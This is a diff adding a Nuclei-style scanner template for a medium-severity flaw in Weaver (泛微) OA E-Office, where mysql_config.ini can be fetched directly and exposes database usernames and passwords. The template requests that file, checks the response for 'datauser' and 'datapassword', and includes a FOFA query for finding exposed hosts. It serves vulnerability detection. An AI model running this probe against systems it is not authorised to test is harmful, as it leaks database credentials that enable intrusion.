@@ -1,0 +1,32 @@
+id: poc-local-oa-weaver-eoffice-database-configuration-file-leaked
+
+info:
+  name: 泛微OA E-Office mysql_config.ini 数据库信息泄漏漏洞
+  author: capiton
+  severity: medium
+  description: 泛微 E-Office mysql_config.ini文件可直接访问，泄漏数据库账号密码等信息
+  reference:
+    - http://wiki.peiqi.tech/wiki/oa/%E6%B3%9B%E5%BE%AEOA/%E6%B3%9B%E5%BE%AEOA%20E-Office%20mysql_config.ini%20%E6%95%B0%E6%8D%AE%E5%BA%93%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E.html
+  metadata:
+    fofa-query: app="泛微-EOffice"
+    Vulnerability-Impact: 泛微OA E-Office
+  tags: weaver,ecology,fanwei,eoffice
+
+
+requests:
+  - method: GET
+    path:
+      - "{{RootURL}}/mysql_config.ini"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        condition: and
+        status:
+          - 200
+
+      - type: word
+        condition: and
+        words:
+          - datauser
+          - datapassword
